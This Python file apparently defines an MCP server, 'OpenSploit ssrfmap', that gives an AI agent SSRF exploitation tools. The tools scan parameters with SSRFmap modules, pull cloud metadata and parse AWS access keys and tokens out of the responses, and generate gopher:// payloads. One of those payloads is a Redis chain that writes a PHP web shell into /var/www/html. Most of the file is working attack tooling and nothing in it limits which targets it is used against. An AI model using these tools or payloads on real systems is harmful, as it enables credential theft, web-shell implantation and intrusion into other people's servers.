#!/usr/bin/env python3
"""
OpenSploit MCP Server: ssrfmap

SSRF exploitation framework via SSRFmap — cloud metadata extraction,
backend service RCE (Redis, MySQL, FastCGI, Memcached), and port scanning
through SSRF vulnerabilities.
"""

import asyncio
import os
import re
import tempfile
from typing import Any, Dict, List, Optional
from urllib.parse import quote as url_quote

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output

SSRFMAP_PATH = "/opt/ssrfmap/ssrfmap.py"

# Available SSRFmap modules
SSRFMAP_MODULES = [
    "axfr", "fastcgi", "github", "memcache", "mysql",
    "networkscan", "portscan", "readfiles", "redis",
    "smtp", "tomcat", "custom",
]

# Cloud metadata endpoints
CLOUD_METADATA = {
    "aws": "http://169.254.169.254/latest/meta-data/",
    "aws_credentials": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_userdata": "http://169.254.169.254/latest/user-data",
    "aws_token": "http://169.254.169.254/latest/api/token",
    "gce": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "digitalocean": "http://169.254.169.254/metadata/v1/",
    "alibaba": "http://100.100.100.200/latest/meta-data/",
}


class SsrfmapServer(BaseMCPServer):
    """MCP server wrapping SSRFmap for SSRF exploitation."""

    def __init__(self):
        super().__init__(
            name="ssrfmap",
            description="SSRF exploitation framework — cloud metadata extraction, backend service RCE, port scanning",
            version="1.0.0",
        )

        self.register_method(
            name="scan",
            description="Test a parameter for SSRF vulnerability using SSRFmap modules",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL (e.g., 'http://target/fetch?url=SSRF_HERE')",
                },
                "param": {
                    "type": "string",
                    "required": True,
                    "description": "Vulnerable parameter name (e.g., 'url', 'path', 'img')",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST"],
                    "default": "GET",
                    "description": "HTTP method",
                },
                "data": {
                    "type": "string",
                    "description": "POST body (e.g., 'url=SSRF_HERE&submit=1')",
                },
                "module": {
                    "type": "string",
                    "enum": SSRFMAP_MODULES,
                    "default": "readfiles",
                    "description": "SSRFmap module: readfiles, portscan, networkscan, redis, mysql, fastcgi, memcache, smtp, tomcat, axfr, github, custom",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom HTTP headers",
                },
                "cookies": {
                    "type": "string",
                    "description": "Cookie header value",
                },
                "level": {
                    "type": "integer",
                    "default": 1,
                    "description": "Test level (1-5). Higher levels try more WAF bypass encodings.",
                },
                "ssl": {
                    "type": "boolean",
                    "default": False,
                    "description": "Use HTTPS",
                },
                "lhost": {
                    "type": "string",
                    "description": "Local host IP for reverse connections (modules: redis, fastcgi)",
                },
                "lport": {
                    "type": "integer",
                    "description": "Local port for reverse connections",
                },
                "target_files": {
                    "type": "array",
                    "description": "Files to read via SSRF (for readfiles module). Default: /etc/passwd, /etc/hosts",
                },
                "proxy": {
                    "type": "string",
                    "description": "HTTP proxy (e.g., 'http://127.0.0.1:8080')",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Overall timeout in seconds",
                },
            },
            handler=self.scan,
        )

        self.register_method(
            name="exploit_metadata",
            description="Extract cloud instance metadata via SSRF (AWS/GCE/Azure/DigitalOcean)",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL with SSRF-vulnerable parameter",
                },
                "param": {
                    "type": "string",
                    "required": True,
                    "description": "Vulnerable parameter name",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST"],
                    "default": "GET",
                    "description": "HTTP method",
                },
                "data": {
                    "type": "string",
                    "description": "POST body",
                },
                "cloud": {
                    "type": "string",
                    "enum": ["aws", "gce", "azure", "digitalocean", "alibaba"],
                    "default": "aws",
                    "description": "Cloud provider to target for metadata extraction",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom HTTP headers",
                },
                "cookies": {
                    "type": "string",
                    "description": "Cookie header value",
                },
                "level": {
                    "type": "integer",
                    "default": 1,
                    "description": "WAF bypass level (1-5)",
                },
                "timeout": {
                    "type": "integer",
                    "default": 30,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.exploit_metadata,
        )

        self.register_method(
            name="generate_gopher",
            description="Generate a gopher:// payload for attacking backend services through SSRF",
            params={
                "service": {
                    "type": "string",
                    "required": True,
                    "enum": ["redis", "mysql", "fastcgi", "memcached", "smtp", "postgres", "zabbix"],
                    "description": "Backend service to target",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command or query to execute (e.g., 'id' for Redis RCE, 'SELECT version()' for MySQL)",
                },
                "target_host": {
                    "type": "string",
                    "default": "127.0.0.1",
                    "description": "Backend service host (usually localhost)",
                },
                "target_port": {
                    "type": "integer",
                    "description": "Backend service port (default: auto-detect from service type)",
                },
            },
            handler=self.generate_gopher,
        )

    def _write_request_file(
        self,
        url: str,
        method: str = "GET",
        data: str = None,
        headers: dict = None,
        cookies: str = None,
    ) -> str:
        """Write an HTTP request file for SSRFmap."""
        from urllib.parse import urlparse
        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"

        lines = []
        if method == "POST" and data:
            lines.append(f"POST {path} HTTP/1.1")
        else:
            lines.append(f"GET {path} HTTP/1.1")

        lines.append(f"Host: {host}")
        lines.append("User-Agent: Mozilla/5.0")

        if headers:
            for k, v in headers.items():
                lines.append(f"{k}: {v}")
        if cookies:
            lines.append(f"Cookie: {cookies}")

        if method == "POST" and data:
            lines.append(f"Content-Type: application/x-www-form-urlencoded")
            lines.append(f"Content-Length: {len(data)}")
            lines.append("")
            lines.append(data)
        else:
            lines.append("")

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False, dir="/tmp"
        ) as f:
            f.write("\r\n".join(lines))
            return f.name

    async def scan(
        self,
        url: str,
        param: str,
        method: str = "GET",
        data: str = None,
        module: str = "readfiles",
        headers: dict = None,
        cookies: str = None,
        level: int = 1,
        ssl: bool = False,
        lhost: str = None,
        lport: int = None,
        target_files: list = None,
        proxy: str = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Test a parameter for SSRF using SSRFmap."""
        self.logger.info(f"SSRF scan: {url} param={param} module={module}")

        req_file = self._write_request_file(url, method, data, headers, cookies)

        cmd = [
            "python3", SSRFMAP_PATH,
            "-r", req_file,
            "-p", param,
            "-m", module,
        ]

        if level > 1:
            cmd.extend(["--level", str(level)])
        if ssl:
            cmd.append("--ssl")
        if lhost:
            cmd.extend(["--lhost", lhost])
        if lport:
            cmd.extend(["--lport", str(lport)])
        if target_files:
            cmd.append("--rfiles")
        if proxy:
            cmd.extend(["--proxy", proxy])

        try:
            result = await self.run_command(cmd, timeout=timeout + 30)
            stdout = result.stdout.strip() if result.stdout else ""
            stderr = result.stderr.strip() if result.stderr else ""
            combined = f"{stdout}\n{stderr}".strip()

            return ToolResult(
                success=True,
                data={
                    "url": url,
                    "param": param,
                    "module": module,
                    "level": level,
                },
                raw_output=sanitize_output(combined, max_length=20000),
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"SSRF scan failed: {e}")
        finally:
            try:
                os.unlink(req_file)
            except OSError:
                pass

    async def exploit_metadata(
        self,
        url: str,
        param: str,
        method: str = "GET",
        data: str = None,
        cloud: str = "aws",
        headers: dict = None,
        cookies: str = None,
        level: int = 1,
        timeout: int = 30,
    ) -> ToolResult:
        """Extract cloud instance metadata via SSRF."""
        self.logger.info(f"SSRF metadata extraction: {url} cloud={cloud}")

        metadata_url = CLOUD_METADATA.get(cloud, CLOUD_METADATA["aws"])

        # Use readfiles module with the metadata URL as target
        req_file = self._write_request_file(url, method, data, headers, cookies)

        cmd = [
            "python3", SSRFMAP_PATH,
            "-r", req_file,
            "-p", param,
            "-m", "readfiles",
            "--rfiles",
        ]

        if level > 1:
            cmd.extend(["--level", str(level)])

        try:
            result = await self.run_command(cmd, timeout=timeout + 30)
            stdout = result.stdout.strip() if result.stdout else ""
            stderr = result.stderr.strip() if result.stderr else ""
            combined = f"{stdout}\n{stderr}".strip()

            # Check for metadata indicators
            metadata_found = False
            credentials = {}

            if "AccessKeyId" in combined or "SecretAccessKey" in combined:
                metadata_found = True
                # Try to extract AWS credentials
                key_match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', combined)
                secret_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', combined)
                token_match = re.search(r'"Token"\s*:\s*"([^"]+)"', combined)
                if key_match:
                    credentials["AccessKeyId"] = key_match.group(1)
                if secret_match:
                    credentials["SecretAccessKey"] = secret_match.group(1)
                if token_match:
                    credentials["Token"] = token_match.group(1)
            elif "ami-" in combined or "instance-id" in combined:
                metadata_found = True

            return ToolResult(
                success=True,
                data={
                    "url": url,
                    "cloud": cloud,
                    "metadata_url": metadata_url,
                    "metadata_found": metadata_found,
                    "credentials": credentials if credentials else None,
                },
                raw_output=sanitize_output(combined, max_length=20000),
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"Metadata extraction failed: {e}")
        finally:
            try:
                os.unlink(req_file)
            except OSError:
                pass

    async def generate_gopher(
        self,
        service: str,
        command: str,
        target_host: str = "127.0.0.1",
        target_port: int = None,
    ) -> ToolResult:
        """Generate a gopher:// payload for attacking backend services."""
        self.logger.info(f"Generating gopher payload: service={service} command={command}")

        # Default ports
        default_ports = {
            "redis": 6379,
            "mysql": 3306,
            "fastcgi": 9000,
            "memcached": 11211,
            "smtp": 25,
            "postgres": 5432,
            "zabbix": 10050,
        }

        port = target_port or default_ports.get(service, 0)

        # Generate gopher payloads for common services
        payload = ""
        if service == "redis":
            # Redis RCE via cron/webshell
            redis_cmds = [
                f"CONFIG SET dir /var/www/html",
                f"CONFIG SET dbfilename shell.php",
                f'SET payload "<?php system(\\"{command}\\"); ?>"',
                "SAVE",
                "QUIT",
            ]
            raw = "\r\n".join(redis_cmds) + "\r\n"
            encoded = url_quote(raw, safe="")
            payload = f"gopher://{target_host}:{port}/_{encoded}"

        elif service == "mysql":
            # MySQL query execution (unauthenticated)
            # This is a simplified payload — real MySQL gopher payloads need binary protocol
            payload = f"gopher://{target_host}:{port}/_{url_quote(command)}"

        elif service == "fastcgi":
            # FastCGI RCE
            payload = f"gopher://{target_host}:{port}/_" + url_quote(
                f"GET /index.php HTTP/1.1\r\nHost: localhost\r\n\r\n"
            )

        elif service == "memcached":
            raw = f"set payload 0 0 {len(command)}\r\n{command}\r\nquit\r\n"
            encoded = url_quote(raw, safe="")
            payload = f"gopher://{target_host}:{port}/_{encoded}"

        elif service == "smtp":
            raw = f"EHLO attacker\r\nMAIL FROM:<test@test.com>\r\nRCPT TO:<admin@target.com>\r\nDATA\r\nSubject: pwned\r\n\r\n{command}\r\n.\r\nQUIT\r\n"
            encoded = url_quote(raw, safe="")
            payload = f"gopher://{target_host}:{port}/_{encoded}"

        elif service == "postgres":
            payload = f"gopher://{target_host}:{port}/_{url_quote(command)}"

        elif service == "zabbix":
            raw = f"Command={command}\n"
            encoded = url_quote(raw, safe="")
            payload = f"gopher://{target_host}:{port}/_{encoded}"

        return ToolResult(
            success=True,
            data={
                "service": service,
                "command": command,
                "target": f"{target_host}:{port}",
                "payload": payload,
                "payload_length": len(payload),
                "usage": f"Inject this gopher:// URL into the SSRF-vulnerable parameter",
            },
            raw_output=payload,
        )


if __name__ == "__main__":
    SsrfmapServer.main()
